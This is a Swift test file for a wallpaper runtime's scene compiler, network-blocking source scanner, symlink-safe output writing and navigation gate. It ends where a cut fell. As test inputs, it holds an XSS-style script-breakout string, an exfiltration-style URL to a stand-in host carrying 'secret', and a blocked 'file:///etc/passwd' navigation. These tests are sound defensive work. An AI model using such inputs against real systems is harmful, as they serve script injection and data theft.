// Self tests owned by WS-runtime: scene compiler, source scanner, check verdicts/report, render
// client socket handling, and (opt-in) one end-to-end check through the real render daemon.
//
//   swift run LivePaperSelfTest runtime.
//   swift build && LIVEPAPER_SELFTEST_E2E=1 swift run LivePaperSelfTest runtime.e2e
//
// Only the e2e test starts a GUI-registered process (one LivePaperRenderd), so it never runs unless
// LIVEPAPER_SELFTEST_E2E=1. With LIVEPAPER_HOME set it uses the render server already serving
// there; otherwise it starts one in a temporary home and shuts it down afterwards.
import Darwin
import Foundation
import LivePaperCore

extension SelfTests {
    static var runtime: [TestCase] {
        [
            TestCase(name: "runtime.compiler.inlinesRuntimeSceneAndAssets", run: RuntimeTests.compilerInlines),
            TestCase(name: "runtime.compiler.escapesScriptTerminators", run: RuntimeTests.compilerEscapes),
            TestCase(name: "runtime.compiler.rejectsNetworkAndModules", run: RuntimeTests.compilerRejectsNetwork),
            TestCase(name: "runtime.compiler.allowsLookalikes", run: RuntimeTests.compilerAllowsLookalikes),
            TestCase(name: "runtime.compiler.manifestErrors", run: RuntimeTests.compilerManifestErrors),
            TestCase(name: "runtime.compiler.assetRules", run: RuntimeTests.compilerAssetRules),
            TestCase(name: "runtime.compiler.templateCompiles", run: RuntimeTests.templateCompiles),
            TestCase(name: "runtime.check.passingReport", run: RuntimeTests.checkPassing),
            TestCase(name: "runtime.check.problemsAreGroupedAndActionable", run: RuntimeTests.checkProblems),
            TestCase(name: "runtime.check.startFailureCollapses", run: RuntimeTests.checkStartFailure),
            TestCase(name: "runtime.check.writesReportAndPerformance", run: RuntimeTests.checkWritesFiles),
            TestCase(name: "runtime.check.compileFailureSkipsRendering", run: RuntimeTests.checkCompileFailure),
            TestCase(name: "runtime.check.symlinkedCheckDirectory", run: RuntimeTests.checkSymlinkedCheckDirectory),
            TestCase(name: "runtime.render.outputConfinement", run: RuntimeTests.renderOutputConfinement),
            TestCase(name: "runtime.render.navigationGate", run: RuntimeTests.navigationGate),
            TestCase(name: "runtime.client.roundTripAndErrors", run: RuntimeTests.clientRoundTrip),
            TestCase(name: "runtime.client.spoolFallback", run: RuntimeTests.clientSpoolFallback),
            TestCase(name: "runtime.client.waitsForServerHoldingLock", run: RuntimeTests.clientWaitsForLockHolder),
            TestCase(name: "runtime.e2e.templateCheck", run: RuntimeTests.endToEnd),
        ]
    }
}

enum RuntimeTests {
    // MARK: - Fixtures

    /// A scene package in a temp dir. `files` maps relative paths to contents.
    static func package(_ name: String, js: String, manifest: String? = nil, files: [String: Data] = [:]) throws -> URL {
        let dir = try tempDir(name).appendingPathComponent("\(name).lpscene")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let m = manifest ?? #"{"id":"\#(name)","name":"Test \#(name)","kind":"web","clock":{"position":"top"}}"#
        try Data(m.utf8).write(to: dir.appendingPathComponent("scene.json"))
        try Data(js.utf8).write(to: dir.appendingPathComponent("scene.js"))
        for (path, data) in files {
            let url = dir.appendingPathComponent(path)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try data.write(to: url)
        }
        return dir
    }

    static let minimalScene = "LivePaper.scene({ draw(lp) { lp.ctx.fillRect(0, 0, lp.w, lp.h); } });\n"

    /// Compiles and returns the issues (empty if it compiled).
    static func issues(_ js: String) throws -> [String] {
        let pkg = try package("scan", js: js)
        do { _ = try SceneCompiler().build(package: pkg); return [] } catch let e as SceneCompileError { return e.messages }
    }

    /// Runs async work from the synchronous test runner.
    static func blocking<T>(_ work: @escaping @Sendable () async throws -> T) throws -> T {
        let box = ResultBox<T>()
        let done = DispatchSemaphore(value: 0)
        Task.detached {
            do { box.result = .success(try await work()) } catch { box.result = .failure(error) }
            done.signal()
        }
        done.wait()
        return try box.result!.get()
    }
    final class ResultBox<T>: @unchecked Sendable { var result: Result<T, Error>? }

    // MARK: - Compiler

    static func compilerInlines() throws {
        // 1×1 PNG.
        let png = Data(base64Encoded: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGD4DwABBAEAwS2OUAAAAABJRU5ErkJggg==")!
        let pkg = try package("inline", js: "LivePaper.scene({ draw(lp) { LivePaper.image('img/dot.png'); } }); // marker-42\n",
                              files: ["assets/img/dot.png": png, "assets/data.json": Data(#"{"a":1}"#.utf8), "assets/.hidden": Data()])
        let compiled = try SceneCompiler().build(package: pkg)
        let html = compiled.html
        try expect(html.contains("LivePaper runtime v1"), "runtime inlined")
        try expect(html.contains("marker-42"), "scene inlined")
        try expect(html.contains("Content-Security-Policy"), "CSP present")
        try expect(html.contains("connect-src 'none'"), "network blocked by CSP")
        try expect(html.contains("\"img/dot.png\":\"data:image/png;base64,\(png.base64EncodedString())\""), "image asset as data URL")
        try expect(html.contains("\"data.json\":\"data:application/json;base64,"), "json asset")
        try expect(!html.contains("\".hidden\":"), "hidden files skipped")
        try expectEqual(compiled.assetBytes, png.count + 7)
        try expect(html.contains("\"id\":\"inline\""), "scene metadata")
        // The scene's first line number is recorded so runtime errors map back to scene.js.
        let meta = html.components(separatedBy: "\"line\":").dropFirst().first?.prefix { $0.isNumber } ?? ""
        let line = Int(meta) ?? 0
        let lines = html.components(separatedBy: "\n")
        try expect(line > 1 && line <= lines.count && lines[line - 1].contains("marker-42"), "line \(line) is the first scene line")
        // compile() writes the same document.
        let out = pkg.appendingPathComponent(".check/scene.html")
        try SceneCompiler().compile(package: pkg, to: out)
        try expectEqual(try String(contentsOf: out, encoding: .utf8), html)
    }

    static func compilerEscapes() throws {
        let js = """
        const a = "</script><script>alert(1)</script>";
        const b = '<!-- not a comment -->';
        const c = `</SCRIPT >`;
        LivePaper.scene({ draw(lp) {} });
        """
        let pkg = try package("escape", js: js, manifest: #"{"id":"escape","name":"A </title> & <b>","kind":"web"}"#)
        let html = try SceneCompiler().build(package: pkg).html
        // Exactly the three script elements the compiler emits are closed.
        try expectEqual(html.components(separatedBy: "</script>").count - 1, 3)
        try expect(!html.lowercased().contains("</script >"), "case-insensitive escape")
        try expect(html.contains(#"\x3C/script><script>alert(1)\x3C/script>"#), "string content preserved as an escape")
        try expect(html.contains(#"\x3C!-- not a comment -->"#), "<!-- escaped")
        try expect(html.contains("<title>A &lt;/title&gt; &amp; &lt;b&gt;</title>"), "title escaped")
        try expectEqual(SceneCompiler.escapeForInlineScript("x</Script>y"), #"x\x3C/script>y"#)
    }

    static func compilerRejectsNetwork() throws {
        let cases: [(String, String)] = [
            ("fetch('data.json');\n" + minimalScene, "network access is not allowed (fetch)"),
            ("const x = new XMLHttpRequest();\n" + minimalScene, "XMLHttpRequest"),
            ("const w = new window.WebSocket('ws://localhost:1');\n" + minimalScene, "WebSocket"),
            ("navigator.sendBeacon('/x');\n" + minimalScene, "sendBeacon"),
            ("const img = 'https://example.com/a.png';\n" + minimalScene, "external URL \"https://example.com/a.png\""),
            ("const u = `https://cdn.example.org/${name}.js`;\n" + minimalScene, "external URL"),
            ("const p = '//cdn.example.org';\n" + minimalScene, "external URL"),
            ("import x from './x.js';\n" + minimalScene, "ES module syntax (import)"),
            ("export const y = 1;\n" + minimalScene, "ES module syntax (export)"),
            ("const m = import('./m.js');\n" + minimalScene, "dynamic import()"),
            ("const s = localStorage.getItem('k');\n" + minimalScene, "localStorage is not available"),
            ("if (window.ok) { fetch('a'); }\n" + minimalScene, "network access is not allowed (fetch)"),
            ("const n = 1;\n", "never calls LivePaper.scene"),
        ]
        for (js, needle) in cases {
            let found = try issues(js)
            try expect(found.contains { $0.contains(needle) }, "expected '\(needle)' for: \(js.prefix(50)) — got \(found)")
        }
        // Positions are precise: line 2, column of the identifier.
        let positioned = try issues("// ok\n  fetch('x');\n" + minimalScene)
        try expect(positioned.first?.hasPrefix("scene.js:2:3:") == true, "line:column \(positioned)")
    }

    static func compilerAllowsLookalikes() throws {
        let js = """
        // See https://example.com/docs for the idea (comments may contain URLs).
        /* and block comments: https://example.org */
        const svgNS = 'http://www.w3.org/2000/svg';
        const store = { fetch() { return 1; } };
        store.fetch();
        function importScripts() {}       // the scene's own function
        const ratio = 10 / 2 / 5;          // division, not a regex
        const re = /https?:\\/\\/[^"]+/g;  // a regex that mentions a scheme
        const msg = `total: ${ratio / 2}`;
        const exported = { export: 1, import: 2 };
        LivePaper.scene({ draw(lp) { lp.ctx.fillText(msg + exported.export, 0, 0); } });
        """
        let found = try issues(js)
        try expect(found.isEmpty, "unexpected issues: \(found)")
    }

    static func compilerManifestErrors() throws {
        /// The compile error text for a package with this manifest and scene.js (nil = file absent).
        func compileError(_ manifest: String?, js: String? = minimalScene) -> String {
            do {
                let dir = try tempDir("manifest").appendingPathComponent("m.lpscene")
                try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
                if let manifest { try Data(manifest.utf8).write(to: dir.appendingPathComponent("scene.json")) }
                if let js { try Data(js.utf8).write(to: dir.appendingPathComponent("scene.js")) }
                _ = try SceneCompiler().build(package: dir)
                return ""
            } catch let e as SceneCompileError {
                return e.messages.joined(separator: "\n")
            } catch {
                return "fixture error: \(error)"
            }
        }
        try expect(compileError(nil).contains("scene.json: is missing"), "missing manifest")
        try expect(compileError("{ nope").contains("is not valid JSON"), "bad JSON")
        try expect(compileError(#"{"name":"x"}"#).contains("required \"id\""), "missing id")
        let clock = compileError(#"{"id":"x","clock":{"position":"middle"}}"#)
        try expect(clock.contains("\"clock.position\"") && clock.contains("bottom-left"), "invalid clock: \(clock)")
        try expect(compileError(#"{"id":"x","kind":"video"}"#).contains("only web scenes"), "video")
        try expect(compileError(#"{"id":"x","runtime":2}"#).contains("\"runtime\": 2 is not supported"), "runtime version")
        try expect(compileError(#"{"id":"x"}"#, js: nil).contains("scene.js: is missing"), "missing scene.js")
        try expect(compileError(#"{"id":"x"}"#, js: "  \n").contains("is empty"), "empty scene.js")
    }

    static func compilerAssetRules() throws {
        let outside = try tempDir("outside").appendingPathComponent("secret.txt")
        try Data("secret".utf8).write(to: outside)
        let pkg = try package("assets", js: minimalScene, files: [
            "assets/tool.exe": Data([0x4D, 0x5A]),
            "assets/logo.svg": Data(#"<svg xmlns="http://www.w3.org/2000/svg"><image href="https://example.com/x.png"/></svg>"#.utf8),
        ])
        try FileManager.default.createSymbolicLink(at: pkg.appendingPathComponent("assets/link.txt"), withDestinationURL: outside)
        do {
            _ = try SceneCompiler().build(package: pkg)
            throw TestFailure(description: "expected asset errors")
        } catch let e as SceneCompileError {
            let all = e.messages.joined(separator: "\n")
            try expect(all.contains("assets/tool.exe: has an unsupported type (.exe)"), all)
            try expect(all.contains("assets/logo.svg:1:") && all.contains("https://example.com/x.png"), all)
            try expect(!all.contains("w3.org"), "XML namespaces are fine")
            try expect(all.contains("assets/link.txt: points outside the scene package"), all)
        }
    }

    static func templateCompiles() throws {
        let template = SceneCompiler.defaultRuntimeDir.appendingPathComponent("templates/web")
        let compiled = try SceneCompiler().build(package: template)
        try expect(SceneManifest.isValidID(compiled.manifest.id), "template id")
        try expectEqual(compiled.manifest.clock.position, .top)
        for doc in ["livepaper.d.ts", "SCENE_API.md", "AGENTS.md"] {
            try expect(FileManager.default.fileExists(atPath: SceneCompiler.defaultRuntimeDir.appendingPathComponent(doc).path), "\(doc) ships")
        }
    }

    // MARK: - Check verdicts

    static func ok(luma: Double = 30, clock: Double = 12) -> RenderResponse {
        RenderResponse(ok: true, ready: true, meanLuma: luma, clockLuma: clock)
    }
    static func bench(_ ms: Double) -> RenderResponse { RenderResponse(ok: true, ready: true, benchMs: ms) }

    /// Results for a whole plan with every render succeeding; `adjust` tweaks individual responses.
    static func results(_ plan: CheckPlan, still: (CheckFrame) -> RenderResponse = { _ in ok() },
                        bench benchFor: (CheckFrame) -> RenderResponse = { _ in bench(1.2) }) -> CheckResults {
        var r = CheckResults()
        r.stills = plan.stills.map { ($0, "/tmp/\($0.fileName)", still($0)) }
        r.probes = plan.probeTimes.map { t in var f = CheckPlan.primary; f.t = t; return (f, benchFor(f)) }
        r.benches = plan.benchSizes.map { var f = $0; f.t = 30; return (f, benchFor(f)) }
        return r
    }

    static func checkPassing() throws {
        let plan = CheckPlan.standard(power: false)
        try expectEqual(plan.stills.count, 13)
        try expect(Set(plan.stills.map(\.sizeLabel)) == ["1512x982@2", "2560x720@1", "1280x1024@1", "320x200@2"], "sizes")
        try expect(plan.stills.contains { $0.t == 600 }, "long-run sample")
        let report = SceneChecker.evaluate(results(plan), plan: plan, budgets: CheckBudgets(), quick: false)
        try expect(report.passed, "problems: \(report.problems)")
        try expect(report.warnings.isEmpty, "warnings: \(report.warnings)")
        try expectEqual(report.stills.count, 13)
        try expectEqual(report.benchMs["1512x982@2 t=30"], 1.2)
        try expectEqual(report.benchMs["5120x1440@1 t=30"], 1.2)
        try expectEqual(report.benchMs["1512x982@2 t=4 probe"], 1.2)
        try expectEqual(SceneChecker.headlineBenchMs(report), 1.2)
        let quick = CheckPlan.quick(power: false)
        let q = SceneChecker.evaluate(results(quick), plan: quick, budgets: CheckBudgets(), quick: true)
        try expect(q.passed && q.warnings.contains { $0.contains("Quick check") }, "quick warns")
    }

    static func checkProblems() throws {
        let plan = CheckPlan.standard(power: true)
        var r = results(plan, still: { f in
            if f.t == 600 && f.sizeLabel == "1512x982@2" { return ok(luma: 0.5, clock: 0.5) }   // decays
            return f.t == 12 ? ok(luma: 200, clock: 180) : ok()                                // too bright at t=12
        }, bench: { f in f.sizeLabel == "5120x1440@1" ? bench(7.5) : bench(3.5) })
        r.stills[0].response.errors = ["draw: TypeError: x is undefined (scene.js:3:5)"]
        r.stills[1].response.errors = ["draw: TypeError: x is undefined (scene.js:3:5)"]   // deduplicated
        r.live = RenderResponse(ok: true, ready: true, fps: 20, cpuMW: 420)
        let report = SceneChecker.evaluate(r, plan: plan, budgets: CheckBudgets(), quick: false)
        try expect(!report.passed, "fails")
        try expectEqual(report.jsErrors, ["draw: TypeError: x is undefined (scene.js:3:5)"])
        try expect(report.problems.first?.hasPrefix("JavaScript error: draw: TypeError") == true, "JS errors first: \(report.problems)")
        let bright = report.problems.filter { $0.contains("too bright for a lock screen") }
        try expectEqual(bright.count, 1) // grouped across the four t=12 stills
        try expect(bright[0].contains("200/255") && bright[0].contains("and 1 more"), bright[0])
        try expect(report.problems.contains { $0.contains("behind the clock is too bright") && $0.contains("180/255") }, "clock")
        try expect(report.problems.contains { $0.contains("decays over long runs") && $0.contains("t=600") }, "long run")
        try expect(report.problems.contains { $0.contains("Too slow at 5120x1440@1") && $0.contains("budget 6.0 ms") }, "wide bench")
        try expect(report.warnings.contains { $0.contains("Close to the frame budget at 1512x982@2") }, "near budget")
        try expect(report.problems.contains { $0.contains("420 mW") && $0.contains("battery profile") }, "energy")
        try expect(report.warnings.contains { $0.contains("Only reached 20.0 of 30 fps") }, "fps")
        try expectEqual(report.energyMw, 420)
        // Every problem names what to do, not just what is wrong.
        for p in report.problems { try expect(p.count > 60 && p.hasSuffix("."), "actionable sentence: \(p)") }
    }

    static func checkStartFailure() throws {
        let plan = CheckPlan.quick(power: false)
        let failed = RenderResponse(ok: false, ready: false, errors: ["SyntaxError: Unexpected token ')' (scene.js:5:0)"],
                                    note: SceneChecker.startFailureNote + " (see errors)")
        let timeout = RenderResponse(ok: false, ready: false, note: "timed out waiting for the scene to become ready")
        var r = results(plan, still: { _ in failed }, bench: { _ in failed })
        r.stills[0].response = timeout
        let report = SceneChecker.evaluate(r, plan: plan, budgets: CheckBudgets(), quick: true)
        try expectEqual(report.problems.count, 3)
        try expect(report.problems[0].contains("SyntaxError"), report.problems[0])
        try expect(report.problems[1].contains("did not finish loading") && report.problems[1].contains("at 1512x982@2 t=4"), report.problems[1])
        try expect(report.problems[2].contains("never started"), report.problems[2])
    }

    /// Records requests and answers like a render server, without rendering anything.
    final class FakeRender: RenderClienting, @unchecked Sendable {
        let lock = NSLock()
        var requests: [RenderRequest] = []
        private func record(_ request: RenderRequest) { lock.lock(); requests.append(request); lock.unlock() }
        func send(_ request: RenderRequest, timeout: TimeInterval) async throws -> RenderResponse {
            record(request)
            switch request.op {
            case .still: return RenderResponse(ok: true, ready: true, out: request.out, meanLuma: 25, clockLuma: 10)
            case .bench: return RenderResponse(ok: true, ready: true, benchMs: request.t == 12 ? 2.5 : 1.0)
            case .live: return RenderResponse(ok: true, ready: true, fps: 30, cpuPct: 9, cpuMW: 70, seconds: 10)
            default: return RenderResponse(ok: true, ready: true)
            }
        }
    }

    static func checkWritesFiles() throws {
        let manifest = #"{"id":"files","name":"Files","kind":"web","x-custom":{"keep":true},"performance":{"energyMw":999}}"#
        let pkg = try package("files", js: minimalScene, manifest: manifest)
        let stale = pkg.appendingPathComponent(".check/old.png"), notes = pkg.appendingPathComponent(".check/notes.txt")
        try FileManager.default.createDirectory(at: stale.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data().write(to: stale); try Data().write(to: notes)
        let fake = FakeRender()
        let checker = SceneChecker(compiler: SceneCompiler(), render: fake)
        let report = try blocking { try await checker.check(package: pkg, options: CheckOptions(quick: false, power: true)) }
        try expect(report.passed, "\(report.problems)")
        // The heaviest probe (t=12) decides where the full benches run.
        let full = fake.requests.filter { $0.op == .bench && $0.frames == 120 }
        try expect(full.count == 2 && full.allSatisfy { $0.t == 12 }, "full benches at the heaviest phase: \(full.map(\.t))")
        try expectEqual(fake.requests.filter { $0.op == .live }.first?.fps, 30)
        try expect(fake.requests.allSatisfy { $0.html == nil || $0.html == pkg.appendingPathComponent(".check/scene.html").path }, "compiled html")
        // .check: our stale outputs replaced, other files left alone.
        try expect(!FileManager.default.fileExists(atPath: stale.path), "stale PNG removed")
        try expect(FileManager.default.fileExists(atPath: notes.path), "foreign file kept")
        let saved = try SceneManifest.decoder().decode(CheckReport.self, from: Data(contentsOf: pkg.appendingPathComponent(".check/report.json")))
        try expectEqual(saved.passed, true)
        try expectEqual(saved.stills.count, 13)
        try expectEqual(saved.energyMw, 70)
        // scene.json: performance recorded, unknown keys preserved.
        let json = try JSONSerialization.jsonObject(with: Data(contentsOf: pkg.appendingPathComponent("scene.json"))) as? [String: Any]
        try expect((json?["x-custom"] as? [String: Any])?["keep"] as? Bool == true, "custom key kept")
        let perf = json?["performance"] as? [String: Any]
        try expectEqual(perf?["benchMs"] as? Double, 2.5)
        try expectEqual(perf?["energyMw"] as? Double, 70)
        try expect(perf?["checkedAt"] is String, "checkedAt")
        try expectEqual(try SceneManifest.load(package: pkg).performance?.benchMs, 2.5)
    }

    /// A package whose .check is a symlink (planted by an agent, or shipped in a downloaded package)
    /// must not make the checker delete or overwrite files wherever the link points.
    static func checkSymlinkedCheckDirectory() throws {
        let fm = FileManager.default
        let pkg = try package("linked", js: minimalScene)
        let victim = try tempDir("victim")
        defer { try? fm.removeItem(at: victim); try? fm.removeItem(at: pkg.deletingLastPathComponent()) }
        for (name, text) in [("photo.png", "my photo"), ("report.json", "my report"), ("scene.html", "my page"), ("keep.txt", "keep")] {
            try Data(text.utf8).write(to: victim.appendingPathComponent(name))
        }
        try fm.createSymbolicLink(at: pkg.appendingPathComponent(".check"), withDestinationURL: victim)
        let fake = FakeRender()
        let report = try blocking { try await SceneChecker(compiler: SceneCompiler(), render: fake).check(package: pkg, options: CheckOptions(quick: true)) }
        try expect(report.passed, "\(report.problems)")
        for (name, text) in [("photo.png", "my photo"), ("report.json", "my report"), ("scene.html", "my page"), ("keep.txt", "keep")] {
            try expectEqual((try? String(contentsOf: victim.appendingPathComponent(name), encoding: .utf8)) ?? "(deleted)", text)
        }
        try expectEqual(try fm.contentsOfDirectory(atPath: victim.path).sorted(), ["keep.txt", "photo.png", "report.json", "scene.html"])
        // The link was replaced by a real directory that holds this check's output.
        let check = pkg.appendingPathComponent(".check")
        try expectEqual((try fm.attributesOfItem(atPath: check.path))[.type] as? FileAttributeType, .typeDirectory)
        try expect(fm.fileExists(atPath: check.appendingPathComponent("report.json").path), "report written into the real .check")
        try expect(fake.requests.allSatisfy { ($0.out ?? check.path).hasPrefix(check.path + "/") || $0.out == nil }, "stills go to the real .check")

        // A .check that holds a symlink named like our output: the link goes, its target stays.
        let target = victim.appendingPathComponent("photo.png")
        try fm.createSymbolicLink(at: check.appendingPathComponent("1512x982@2-t4.png"), withDestinationURL: target)
        _ = try blocking { try await SceneChecker(compiler: SceneCompiler(), render: fake).check(package: pkg, options: CheckOptions(quick: true)) }
        try expectEqual((try? String(contentsOf: target, encoding: .utf8)) ?? "(deleted)", "my photo")
    }

    /// The render server runs outside any agent sandbox, so the `out` a client names must stay in
    /// the request's own .check (or scene package, for thumbnails), LivePaper's AI workspaces or a
    /// temporary directory — with symlinks resolved at the moment of writing.
    static func renderOutputConfinement() throws {
        let fm = FileManager.default
        let root = try tempDir("outputs").resolvingSymlinksInPath()
        defer { try? fm.removeItem(at: root) }
        let support = root.appendingPathComponent("support"), scratch = root.appendingPathComponent("tmp")
        let home = root.appendingPathComponent("home")
        for d in [support.appendingPathComponent("Workspaces/s1/scene/.check"), scratch, home] {
            try fm.createDirectory(at: d, withIntermediateDirectories: true)
        }
        let policy = RenderOutputPolicy(supportRoot: support, temporaryDirectories: [scratch])
        let pkg = try package("out", js: minimalScene)
        let check = pkg.appendingPathComponent(".check")
        try fm.createDirectory(at: check, withIntermediateDirectories: true)
        let html = check.appendingPathComponent("scene.html")
        try Data("<html></html>".utf8).write(to: html)
        let png = Data([0x89, 0x50, 0x4E, 0x47, 1, 2, 3])
        func still(_ out: URL) -> RenderRequest { RenderRequest(op: .still, html: html.path, out: out.path) }
        func refused(_ r: RenderRequest, _ why: String) throws {
            do { _ = try policy.write(png, for: r); throw TestFailure(description: "expected a refusal: \(why) (\(r.out ?? "-"))") }
            catch is RenderOutputError {}
        }

        // Allowed: the html's .check, the AI workspaces (missing folders are created), the temp dir.
        try expectEqual(try Data(contentsOf: try policy.write(png, for: still(check.appendingPathComponent("a.png")))), png)
        let ws = support.appendingPathComponent("Workspaces/s1/scene/.check/new/b.png")
        _ = try policy.write(png, for: still(ws))
        try expectEqual(try Data(contentsOf: ws), png)
        _ = try policy.write(png, for: still(scratch.appendingPathComponent("c.png")))
        try expectEqual(try Data(contentsOf: check.appendingPathComponent("a.png")), png)

        // Refused: anywhere else, other file types, through a symlinked folder, over a non-file.
        let thesis = home.appendingPathComponent("thesis.png")
        try Data("my thesis".utf8).write(to: thesis)
        try refused(still(thesis), "outside every allowed root")
        try refused(still(check.appendingPathComponent("notes.docx")), "not a PNG")
        try refused(still(URL(fileURLWithPath: "relative.png")), "relative")
        try refused(still(check.appendingPathComponent("../../../home/thesis.png")), "dot-dot")
        let linked = support.appendingPathComponent("Workspaces/s1/scene/.check/linked")
        try fm.createSymbolicLink(at: linked, withDestinationURL: home)
        try refused(still(linked.appendingPathComponent("thesis.png")), "symlinked folder")
        try fm.createSymbolicLink(at: check.appendingPathComponent("link.png"), withDestinationURL: thesis)
        try refused(still(check.appendingPathComponent("link.png")), "destination is a symlink")
        try fm.createDirectory(at: check.appendingPathComponent("dir.png"), withIntermediateDirectories: true)
        try refused(still(check.appendingPathComponent("dir.png")), "destination is a directory")
        // An html outside any .check doesn't make its folder writable.
        let looseHTML = home.appendingPathComponent("page.html")
        try Data().write(to: looseHTML)
        try refused(RenderRequest(op: .still, html: looseHTML.path, out: home.appendingPathComponent("x.png").path), "html's folder isn't a .check")
        try expectEqual(try String(contentsOf: thesis, encoding: .utf8), "my thesis")
        try expectEqual(try fm.contentsOfDirectory(atPath: home.path).sorted(), ["page.html", "thesis.png"])

        // Thumbnails: into the scene package they render (JPEG only).
        let thumb = RenderRequest(op: .thumbnail, scene: pkg.path, out: pkg.appendingPathComponent("thumbnail.jpg").path)
        _ = try policy.write(png, for: thumb)
        try refused(RenderRequest(op: .thumbnail, scene: pkg.path, out: pkg.appendingPathComponent("thumbnail.png").path), "not a JPEG")
        try refused(RenderRequest(op: .thumbnail, scene: home.path, out: home.appendingPathComponent("thumbnail.jpg").path), "not a scene package")
        try refused(RenderRequest(op: .thumbnail, scene: pkg.path, out: home.appendingPathComponent("thumbnail.jpg").path), "outside the package")
        // Requests that write nothing need no out.
        try refused(RenderRequest(op: .bench, html: html.path, out: check.appendingPathComponent("z.png").path), "bench writes nothing")
    }

    /// Scene web views allow exactly the load their host started; a scene navigating anywhere
    /// (`location = 'ht' + 'tps://…'` gets past the source scanner) is cancelled.
    static func navigationGate() throws {
        typealias R = SceneNavigationGate.Request
        let base = URL(string: "livepaper-render://scene/")!
        var render = SceneNavigationGate()
        try expect(!render.decide(R(url: base, isMainFrame: true)), "nothing is allowed before the host loads")
        render.expect(base)
        try expect(!render.decide(R(url: URL(string: "https://lpnav.invalid/leak?d=secret"), isMainFrame: true)), "remote")
        try expect(!render.decide(R(url: base, isMainFrame: false)), "subframe")
        try expect(!render.decide(R(url: base, isMainFrame: true, opensNewWindow: true)), "new window")
        try expect(!render.decide(R(url: base, isMainFrame: true, kind: .linkActivated)), "link")
        try expect(!render.decide(R(url: base, isMainFrame: true, isDownload: true)), "download")
        try expect(render.decide(R(url: base, isMainFrame: true)), "the host's own load")
        try expect(!render.decide(R(url: base, isMainFrame: true)), "only once: a scene reloading itself is cancelled")
        try expect(!render.decide(R(url: URL(string: "livepaper-render://scene/#t=3"), isMainFrame: true)), "in-page navigation")
        render.expect(base)
        try expect(render.decide(R(url: URL(string: "livepaper-render://scene/")!, isMainFrame: true)), "re-armed by the next host load")

        var saver = SceneNavigationGate()
        saver.expect(URL(string: "about:blank")!)
        for blocked in ["data:text/html,<p>x", "blob:null/1234", "about:srcdoc", "file:///etc/passwd", "http://127.0.0.1/"] {
            try expect(!saver.decide(R(url: URL(string: blocked), isMainFrame: true)), blocked)
        }
        try expect(saver.decide(R(url: URL(string: "about:blank"), isMainFrame: true)), "saver's loadHTMLString(baseURL: nil)")

        var preview = SceneNavigationGate()
        let file = URL(fileURLWithPath: "/tmp/LivePaperPreviews/aurora-1.html")
        preview.expect(file)
        try expect(!preview.decide(R(url: URL(fileURLWithPath: "/tmp/LivePaperPreviews/other.html"), isMainFrame: true)), "other file")
        try expect(preview.decide(R(url: file, isMainFrame: true)), "the preview's own file")
        try expectEqual(SceneNavigationGate.describe(URL(string: "https://user:pw@lpnav.invalid/leak?d=secret#x")), "https://lpnav.invalid/leak")
    }

    /// In an AI session whose sandbox blocks the socket, the client leaves the request in the
    /// session's spool for the runner to relay — and never starts a render daemon itself.
    static func clientSpoolFallback() throws {
        let fm = FileManager.default
        let spool = try tempDir("spool")
        defer { try? fm.removeItem(at: spool) }
        let socket = URL(fileURLWithPath: "/tmp/lp-nosock-\(UUID().uuidString.prefix(8)).sock")
        let client = RenderClient(socket: socket, spool: spool)
        try expect(!client.allowSpawn, "never spawns a daemon from inside a session")
        // A stand-in for RenderRelay: claim, answer.
        let stop = Flag()
        Thread {
            while !stop.isSet {
                for name in (try? fm.contentsOfDirectory(atPath: spool.path)) ?? [] where name.hasSuffix(".request.json") {
                    let id = String(name.dropLast(".request.json".count))
                    let claimed = spool.appendingPathComponent(id + ".working")
                    guard rename(spool.appendingPathComponent(name).path, claimed.path) == 0,
                          let req = try? JSONDecoder().decode(RenderRequest.self, from: Data(contentsOf: claimed)) else { continue }
                    let resp = RenderResponse(ok: true, ready: true, note: "relayed \(req.op.rawValue) t=\(Int(req.t ?? -1))")
                    try? JSONEncoder().encode(resp).write(to: spool.appendingPathComponent(id + ".response.json"), options: .atomic)
                }
                usleep(20_000)
            }
        }.start()
        let r = try client.sendBlocking(RenderRequest(op: .still, html: "/x/.check/scene.html", t: 7), timeout: 10)
        stop.set()
        try expectEqual(r.note, "relayed still t=7")
        try expectEqual(try fm.contentsOfDirectory(atPath: spool.path), [])   // the client cleans up
        // Nobody relays: a clear error after the claim timeout, not a hang until the request timeout.
        let lonely = RenderClient(socket: socket, spool: spool)
        lonely.spoolClaimTimeout = 0.5
        let began = Date()
        do { _ = try lonely.sendBlocking(RenderRequest(op: .bench, html: "/x/.check/scene.html"), timeout: 30); throw TestFailure(description: "expected an error") }
        catch let e as RenderClientError { try expect("\(e.localizedDescription)".contains("didn't pick up"), e.localizedDescription) }
        try expect(Date().timeIntervalSince(began) < 5, "gave up promptly")
        try expectEqual(try fm.contentsOfDirectory(atPath: spool.path), [])
    }
    final class Flag: @unchecked Sendable {
        private let lock = NSLock(); private var value = false
        var isSet: Bool { lock.lock(); defer { lock.unlock() }; return value }
        func set() { lock.lock(); value = true; lock.unlock() }
    }

    static func checkCompileFailure() throws {
        let pkg = try package("broken", js: "fetch('x');\n" + minimalScene)
        let fake = FakeRender()
        let report = try blocking { try await SceneChecker(render: fake).check(package: pkg, options: CheckOptions()) }
        try expect(!report.passed, "fails")
        try expect(report.problems.contains { $0.hasPrefix("scene.js:1:1: network access") }, "\(report.problems)")
        try expect(fake.requests.isEmpty, "nothing rendered")
        try expect(FileManager.default.fileExists(atPath: pkg.appendingPathComponent(".check/report.json").path), "report written")
        let manifest = try SceneManifest.load(package: pkg)
        try expect(manifest.performance == nil, "no performance for a failed check")
    }

    // MARK: - Render client

    /// A one-connection-at-a-time JSON-lines server on a background thread.
    static func serve(_ socket: URL, count: Int, reply: @escaping @Sendable (Data) -> Data) throws -> Thread {
        let listener = try LineSocket.listen(path: socket.path)
        let thread = Thread {
            for _ in 0..<count {
                var p = pollfd(fd: listener, events: Int16(POLLIN), revents: 0)
                guard poll(&p, 1, 10_000) > 0 else { break }
                let fd = accept(listener, nil, nil)
                guard fd >= 0 else { continue }
                if let line = try? LineSocket.readLine(fd, deadline: Date().addingTimeInterval(5)) {
                    try? LineSocket.writeAll(fd, reply(line) + Data([0x0A]), deadline: Date().addingTimeInterval(5))
                }
                close(fd)
            }
            close(listener)
        }
        thread.start()
        return thread
    }

    static func clientRoundTrip() throws {
